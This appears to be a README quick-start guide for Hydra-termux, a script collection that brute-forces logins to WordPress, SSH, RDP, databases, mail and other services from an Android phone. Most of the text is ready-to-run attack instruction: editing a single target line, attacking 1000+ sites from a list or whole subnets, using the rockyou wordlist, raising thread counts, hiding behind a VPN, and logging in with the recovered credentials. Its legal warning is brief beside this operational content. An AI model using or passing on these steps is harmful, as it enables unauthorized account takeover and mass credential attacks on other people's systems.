# Hydra-termux Quick Start Guide

## 🆘 **HAVING PROBLEMS? RUN THIS FIRST:**

```bash
./fix-hydra.sh
```

This ONE command diagnoses and fixes 99% of issues automatically!

---

## ⚠️ REAL ATTACKS ONLY - NO MOCK DATA

**These scripts execute REAL Hydra attacks with REAL network connections and produce REAL, usable credentials.**

- Every success is a verified, working credential
- All failures are actual failed authentication attempts  
- No simulations, no dummy data, no fake results
- Test found credentials manually - they WILL work

**📱 Full Termux Guide**: See [docs/TERMUX_DEPLOYMENT.md](docs/TERMUX_DEPLOYMENT.md) for Android/Termux installation.

---

## 🚀 5-Minute Quick Start

### Step 0: If Anything Goes Wrong (30 seconds)

**Use the interactive help system:**
```bash
./fix-hydra.sh
# or
bash scripts/help.sh
```

**Run system diagnostics:**
```bash
bash scripts/system_diagnostics.sh
```

### Step 1: Install on Termux (2 minutes)
```bash
# On your Android device, open Termux
pkg update && pkg upgrade -y
pkg install git -y

git clone https://github.com/vinnieboy707/Hydra-termux
cd Hydra-termux
bash install.sh
```

**If installation fails:**
```bash
bash scripts/auto_fix.sh  # Auto-repairs installation
```

### Step 2: Choose Your Attack (30 seconds)

Pick one based on your target:

| Target Type | Script to Use |
|-------------|---------------|
| 🌐 WordPress site | `Library/wordpress_quick.sh` |
| 🌐 Any website | `Library/web_quick.sh` |
| 🔐 SSH server | `Library/ssh_quick.sh` |
| 📧 Email-based | `Library/email_quick.sh` |
| 🖥️ Windows RDP | `Library/rdp_quick.sh` |
| 🗄️ MySQL database | `Library/mysql_quick.sh` |
| 🌍 Full network | `Library/combo_full_infrastructure.sh` |

### Step 3: Edit ONE Line (30 seconds)
```bash
nano Library/wordpress_quick.sh

# Change line 4:
TARGET="http://your-target.com"  # <-- Only edit this!

# Save: Ctrl+X, Y, Enter
```

### Step 4: Run It (2 minutes)
```bash
bash Library/wordpress_quick.sh
```

### Step 5: Get Results (instant)
```bash
# View successful attacks
bash scripts/results_viewer.sh

# Or check the JSON file
cat ~/hydra-logs/results_web.json
```

---

## 📋 Complete Example: Get WordPress Admin Access

### Scenario: Attack WordPress at example.com

**Step-by-step**:

```bash
# 1. Open the WordPress script
nano Library/wordpress_quick.sh

# 2. Edit ONLY this line (line 4):
TARGET="http://example.com"

# 3. Save and exit (Ctrl+X, Y, Enter)

# 4. Run the attack
bash Library/wordpress_quick.sh

# 5. Wait for results (usually 2-10 minutes)
# Output will show:
# [+] SUCCESS! Username: admin, Password: Welcome123

# 6. View saved results
bash scripts/results_viewer.sh --protocol web

# 7. VERIFY RESULTS ARE REAL (Proof of Authenticity)
# Test the credentials manually in a browser:
# - Go to http://example.com/wp-admin
# - Enter username: admin
# - Enter password: Welcome123
# - Click Login
# ✅ You will successfully log in (proves credentials are REAL)
```

**That's it!** Credentials saved in `~/hydra-logs/results_web.json`

**🔍 Verification**: The found credentials will work when you test them manually. This proves all results are real, not simulated.

---

## 📧 Get Password for Specific Email/Username

### Scenario: Target user is webmaster@example.com

```bash
# 1. Open email attack script
nano Library/email_quick.sh

# 2. Edit TWO lines:
EMAIL="webmaster@example.com"  # Line 4
TARGET="http://example.com"    # Line 5

# 3. Save and run
bash Library/email_quick.sh

# 4. Get results
bash scripts/results_viewer.sh
```

---

## 🌐 Attack Any Website (Auto-Detect Admin Panel)

```bash
# 1. Use web quick script
nano Library/web_quick.sh

# 2. Change target
TARGET="http://example.com"  # Script will find admin panel

# 3. Run
bash Library/web_quick.sh

# Script automatically:
# - Finds /admin, /wp-admin, /login.php, etc.
# - Detects form structure
# - Tests common credentials
# - Saves results
```

---

## 🎯 Attack 1000+ Targets from File

### Create Target List

```bash
cat > targets.txt << 'EOF'
http://site1.com
http://site2.com
http://site3.com
192.168.1.100
192.168.1.101
EOF
```

### Attack All Targets

```bash
# 1. Open any quick script
nano Library/web_quick.sh

# 2. Point to your file
TARGET="targets.txt"

# 3. Run bulk attack
bash Library/web_quick.sh

# Results saved per-target!
```

---

## 🛡️ VPN Protection (Auto-Enabled)

All scripts check VPN automatically:

```bash
# Check VPN status
bash scripts/vpn_check.sh

# Skip VPN check (testing only)
bash Library/ssh_quick.sh --skip-vpn
```

---

## 📊 View All Your Results

```bash
# View all successful attacks
bash scripts/results_viewer.sh

# Filter by protocol
bash scripts/results_viewer.sh --protocol web
bash scripts/results_viewer.sh --protocol ssh

# Filter by target
bash scripts/results_viewer.sh --target example.com

# Export to CSV
bash scripts/results_viewer.sh --export report.csv
```

---

## 🔧 Common Customizations

### Use Custom Wordlist

```bash
# Download big wordlists
bash scripts/download_wordlists.sh

# Use rockyou.txt (14M passwords)
bash scripts/ssh_admin_attack.sh \
  -t 192.168.1.100 \
  -w ~/wordlists/rockyou.txt
```

### Increase Speed (More Threads)

```bash
# Default: 16 threads
# Fast: 32 threads
# Blazing: 64 threads (may cause lockouts!)

bash scripts/ssh_admin_attack.sh -t TARGET -T 32
```

### Attack CIDR Range

```bash
# Attack entire subnet
nano Library/ssh_quick.sh

# Change to:
TARGET="192.168.1.0/24"  # Attacks 254 IPs!

bash Library/ssh_quick.sh
```

---

## 🎓 Full Tutorial

For complete instructions, see: `docs/STEP_BY_STEP_TUTORIAL.md`

Covers:
- ✅ Advanced web attacks
- ✅ Multi-target strategies
- ✅ Protocol combinations
- ✅ Troubleshooting
- ✅ Real-world scenarios

---

## 📖 Script Reference

### Quick Library (One-Line-Change)

Located in `Library/`:

**Basic Protocols** (12):
- `ssh_quick.sh` - SSH brute-force
- `ftp_quick.sh` - FTP attack
- `web_quick.sh` - Web admin panels
- `wordpress_quick.sh` - WordPress specific
- `rdp_quick.sh` - Windows RDP
- `mysql_quick.sh` - MySQL database
- `postgres_quick.sh` - PostgreSQL
- `smb_quick.sh` - Windows SMB/CIFS
- `email_quick.sh` - Email-based attack
- `username_quick.sh` - Specific username
- `network_quick.sh` - Network scan
- `auto_attack_quick.sh` - Auto everything

**Additional Protocols** (10):
- `telnet_quick.sh` - Telnet
- `vnc_quick.sh` - VNC
- `smtp_quick.sh` - SMTP mail
- `pop3_quick.sh` - POP3
- `imap_quick.sh` - IMAP
- `ldap_quick.sh` - LDAP/AD
- `mssql_quick.sh` - MS SQL Server
- `mongodb_quick.sh` - MongoDB
- `redis_quick.sh` - Redis
- `snmp_quick.sh` - SNMP

**Combinations** (7):
- `combo_web_db.sh` - Web + Database
- `combo_network_stack.sh` - SSH+FTP+MySQL+SMB
- `combo_windows_infra.sh` - RDP+SMB+MSSQL+LDAP
- `combo_mail_stack.sh` - SMTP+POP3+IMAP+Web
- `combo_db_cluster.sh` - All databases
- `combo_iot_devices.sh` - IoT protocols
- `combo_full_infrastructure.sh` - ALL 16 protocols!

**Advanced Tools** (9):
- `nmap_stealth_scan.sh` - Stealth scanning
- `nmap_full_scan.sh` - Complete scan
- `nmap_vuln_scan.sh` - Vulnerability detection
- `nmap_os_detection.sh` - OS fingerprinting
- `nmap_network_discovery.sh` - Network mapping
- `ssl_analyzer.sh` - SSL/TLS testing
- `web_directory_bruteforce.sh` - Find admin panels
- `web_header_analyzer.sh` - Security headers
- `multi_target_ssh.sh` - Bulk SSH attacks

### Full-Featured Scripts

Located in `scripts/` - Use with command-line options:

```bash
bash scripts/ssh_admin_attack.sh -t TARGET -T 32 -v --help
```

---

## ⚠️ LEGAL WARNING

**ONLY USE ON**:
- ✅ Your own systems
- ✅ Authorized targets (with written permission)
- ✅ Legal penetration testing

**NEVER USE ON**:
- ❌ Systems without authorization
- ❌ Other people's websites
- ❌ Any unauthorized targets

Unauthorized access = Federal crime = Prison time

**Get authorization first. Always.**

---

## 🆘 Troubleshooting - NEW DIAGNOSTIC TOOLS!

### 🎯 Quick Diagnosis & Fix

**ONE COMMAND to fix everything:**
```bash
./fix-hydra.sh
```

**Interactive help center:**
```bash
bash scripts/help.sh
```

**System health check (A-F grade):**
```bash
bash scripts/system_diagnostics.sh
```

**Auto-repair tool:**
```bash
bash scripts/auto_fix.sh
```

**Quick dependency check:**
```bash
bash scripts/check_dependencies.sh
```

### Common Problems & Solutions

| Problem | Quick Solution | Detailed Solution |
|---------|---------------|-------------------|
| "Hydra not found" | `./fix-hydra.sh` → option 1 | `bash scripts/auto_fix.sh` |
| "Permission denied" | `./fix-hydra.sh` → option 2 | `chmod +x *.sh scripts/*.sh` |
| "VPN not detected" | Add `--skip-vpn` flag | `bash scripts/vpn_check.sh` |
| "No results" | Run diagnostics | `bash scripts/system_diagnostics.sh` |
| Script won't run | Check permissions | `./fix-hydra.sh` |
| Installation failed | Auto-fix | `bash scripts/auto_fix.sh` |
| Unknown issue | Interactive help | `bash scripts/help.sh` |

### 📚 Complete Troubleshooting Guide

For detailed solutions to any problem:
```bash
cat docs/TROUBLESHOOTING.md
# 10,000+ word comprehensive guide!
```

---

## 💡 Pro Tips

1. **Start VPN first**: Always connect before attacking
2. **Use diagnostic tools**: Run `./fix-hydra.sh` if anything fails
3. **Check system health**: `bash scripts/system_diagnostics.sh` before major attacks
4. **Use small wordlists first**: Test with 100 passwords before trying 14M
5. **Reduce threads for stealth**: `-T 4` instead of `-T 32`
6. **Check results often**: `bash scripts/results_viewer.sh`
7. **Save your target lists**: Reuse `targets.txt` files
8. **Generate custom wordlists**: `bash scripts/wordlist_generator.sh`
9. **Combine protocols**: Use `combo_*` scripts for complete audits
10. **Run first-time setup**: `bash scripts/setup_wizard.sh` for guided installation

---

## 📞 Need Help?

### New Diagnostic Tools (Start Here!)
1. **Interactive help**: `./fix-hydra.sh` or `bash scripts/help.sh`
2. **System diagnostics**: `bash scripts/system_diagnostics.sh`
3. **Auto-repair**: `bash scripts/auto_fix.sh`
4. **Setup wizard**: `bash scripts/setup_wizard.sh`

### Documentation
1. **Help flag**: `bash script.sh --help`
2. **Full troubleshooting**: `docs/TROUBLESHOOTING.md` (10,000+ words!)
3. **Full tutorial**: `docs/STEP_BY_STEP_TUTORIAL.md`
4. **Protocol guide**: `Library/PROTOCOL_GUIDE.md`
4. **Usage docs**: `docs/USAGE.md`
5. **Examples**: `docs/EXAMPLES.md`

---

## 🎯 Most Common Use Case

**"I want to get admin access to my WordPress site"**

```bash
# 1. Edit
nano Library/wordpress_quick.sh
# Change: TARGET="http://your-site.com"

# 2. Run
bash Library/wordpress_quick.sh

# 3. Get result
bash scripts/results_viewer.sh --protocol web

# Done! That's literally it.
```

---

**Remember**: Use ethically. Get authorization. Stay legal. 🛡️

**Happy (legal) hacking!** 🎉
